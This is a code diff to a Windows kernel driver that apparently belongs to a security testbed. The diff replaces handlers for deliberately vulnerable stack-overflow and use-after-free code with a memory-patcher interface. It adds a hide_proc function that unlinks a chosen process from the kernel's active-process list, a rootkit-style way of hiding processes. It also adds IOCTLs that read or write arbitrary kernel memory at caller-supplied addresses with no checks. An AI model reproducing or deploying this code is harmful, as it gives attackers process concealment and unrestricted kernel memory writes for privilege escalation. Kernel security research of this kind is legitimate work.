@@ -49,7 +49,6 @@ _IRQL_requires_max_(PASSIVE_LEVEL) bool DriverpIsSuppoetedOS();
 // variables
 //
 
-static basic_mem_access::BasicMemoryAccess g_basic_access;
 ////////////////////////////////////////////////////////////////////////////////
 //
 // implementations
@@ -78,10 +77,10 @@ _Use_decl_annotations_ static void DriverpDriverUnload(
   PAGED_CODE();
   //TESTBED_COMMON_DBG_BREAK();
 
-  remove_symbol_link(TESTBED_LINKNAME_APP);
+  remove_symbol_link(TESTBEDMP_LINKNAME_APP);
   remove_control_device(driver_object);
 
-  DbgPrint("The driver [%ws] has been unloaded! \r\n", TESTBED_SYS_FILE);
+  DbgPrint("The driver [%ws] has been unloaded! \r\n", TESTBEDMP_SYS_FILE);
 }
 
 // Create-Close handler
@@ -161,10 +160,37 @@ _Use_decl_annotations_ static void read_param(IN PIRP pIrp,
 	}
 }
 
+void hide_proc(const ULONG64 procID) {
+
+	const int apl_offset = 0x2e8;
+	const int pid_offset = 0x2e0;
+
+	PLIST_ENTRY current_apl = (PLIST_ENTRY) ((char*)PsInitialSystemProcess + apl_offset);
+	const PLIST_ENTRY begin_apl = current_apl;
+
+	ULONG64 curret_pid = 0;
+
+	do
+	{
+		curret_pid = *(ULONG64*)( (char*)current_apl - apl_offset + pid_offset);
+		if (procID == curret_pid){
+			RemoveEntryList(current_apl);
+			break;
+		}
+		current_apl = current_apl->Flink;
+	} while (begin_apl != current_apl);
+}
+
 // IOCTL dispatch handler
 _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
 	UNREFERENCED_PARAMETER(pDeviceObject);
 	PAGED_CODE();
+
+	ULONG_PTR LowLimit = { 0 };
+	ULONG_PTR HighLimit = { 0 };
+	IoGetStackLimits(&LowLimit, &HighLimit);
+	DbgPrint("Stack limits [DriverpDeviceControl] %I64X-%I64X \r\n",
+		LowLimit, HighLimit);
 
 	const auto stack = IoGetCurrentIrpStackLocation(pIrp);
 	PVOID in_buf = NULL, out_buf = NULL;
@@ -174,34 +200,45 @@ _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pD
 	read_param(pIrp, in_buf, in_buf_sz, out_buf, out_buf_sz);
 	switch (stack->Parameters.DeviceIoControl.IoControlCode)
 	{
-		case TESTBED_BASIC_MEMORY_ACCESS:
-			status = g_basic_access.basic_memory_accesses();
-			info = in_buf_sz;
+		case TESTBED_MEM_PATCHER_HIDE_PROC:
+			if (in_buf_sz == sizeof ULONG64) {
+				ULONG64 pid = 0;
+				ULONG64* pdata = (ULONG64*)in_buf;
+				__try {
+					pid = *pdata;
+				}
+				__except (EXCEPTION_EXECUTE_HANDLER) { pid = 0; }
+				if (pid){
+					hide_proc(pid);
+				}
+			}
 			break;
-		case TESTBED_SIMPLE_STACK_OVERFLOW:
-			status = vulnerable_code::stack_overflow_stub(in_buf, in_buf_sz);
-			info = in_buf_sz;
+		case TESTBED_MEM_PATCHER_READ_1_BYTE:
+			if (in_buf_sz == sizeof ADDR_BYTE) {
+				ADDR_BYTE* pdata = (ADDR_BYTE*)in_buf;
+				__try {
+					pdata->value = *(char*)pdata->addr;
+				}
+				__except (EXCEPTION_EXECUTE_HANDLER) {   }
+			}
 			break;
-		case TESTBED_STACK_OVERFLOW_FROM_HEVD:
-			/* Wrong function call, because we need a second function-stub, which will be called by TriggerStackOverflow() */
-			status = vulnerable_code::TriggerStackOverflow(in_buf, in_buf_sz);
-			info = in_buf_sz;
+		case TESTBED_MEM_PATCHER_WRITE_1_BYTE:
+			if (in_buf_sz == sizeof ADDR_BYTE) {
+				ADDR_BYTE* pdata = (ADDR_BYTE*)in_buf;
+				__try {
+					*(char*)pdata->addr = pdata->value;
+				}
+				__except (EXCEPTION_EXECUTE_HANDLER) {   }
+			}
 			break;
-		case TESTBED_UAF_ALLOCATE_OBJECT:
-			status = vulnerable_code::uaf_allocate_object_stub();
-			info = in_buf_sz;
-			break;
-		case TESTBED_UAF_FREE_OBJECT:
-			status = vulnerable_code::uaf_free_object_stub();
-			info = in_buf_sz;
-			break;
-		case TESTBED_UAF_USE_OBJECT:
-			status = vulnerable_code::uaf_use_object_stub();
-			info = in_buf_sz;
-			break;
-		case TESTBED_UAF_ALLOCATE_FAKE:
-			status = vulnerable_code::uaf_allocate_fake_stub(in_buf);
-			info = in_buf_sz;
+		case TESTBED_MEM_PATCHER_WRITE_8_BYTES:
+			if (in_buf_sz == sizeof ADDR_8BYTES) {
+				ADDR_8BYTES* pdata = (ADDR_8BYTES*)in_buf;
+				__try {
+					*(ULONG64*)pdata->addr = pdata->value;
+				}
+				__except (EXCEPTION_EXECUTE_HANDLER) {   }
+			}
 			break;
 		default: {}
 	}
@@ -211,8 +248,6 @@ _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pD
 	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
 	return STATUS_SUCCESS;
 }
-
-
 
 // Test if the system is one of supported OS versions
 _Use_decl_annotations_ bool DriverpIsSuppoetedOS() {
@@ -280,14 +315,18 @@ _Use_decl_annotations_ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object,
 	PAGED_CODE();
 	
 	DbgPrint("********************************* \r\n");
-	DbgPrint("The driver [%ws] has been loaded! \r\n\r\n\r\n", TESTBED_SYS_FILE);
+	DbgPrint("The driver [%ws] has been loaded to %I64X-%I64X \r\n", 
+		driver_object->DriverName.Buffer,
+		driver_object->DriverStart, (char*)driver_object->DriverStart+ driver_object->DriverSize);
+	
+	DbgPrint("\r\n********************************* \r\n");
 
 	// Test if the system is supported
-	if (!DriverpIsSuppoetedOS()) {
-		return STATUS_CANCELLED;
-	}
+// 	if (!DriverpIsSuppoetedOS()) {
+// 		return STATUS_CANCELLED;
+// 	}
 
-	print_smep_status();
+//	print_smep_status();
 
 	driver_object->DriverUnload = DriverpDriverUnload;
 	driver_object->MajorFunction[IRP_MJ_CREATE] =
@@ -296,11 +335,8 @@ _Use_decl_annotations_ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object,
 	driver_object->MajorFunction[IRP_MJ_WRITE] = DriverpReadWrite;
 	driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverpDeviceControl;
 
-	auto nt_status = create_device(driver_object, NULL, TESTBED_DEVICENAME_DRV, TESTBED_LINKNAME_DRV);
+	auto nt_status = create_device(driver_object, NULL, TESTBEDMP_DEVICENAME_DRV, TESTBEDMP_LINKNAME_DRV);
 
-	if (NT_SUCCESS(nt_status)){
-		g_basic_access.init();
-	}
 	return nt_status;
 }
 
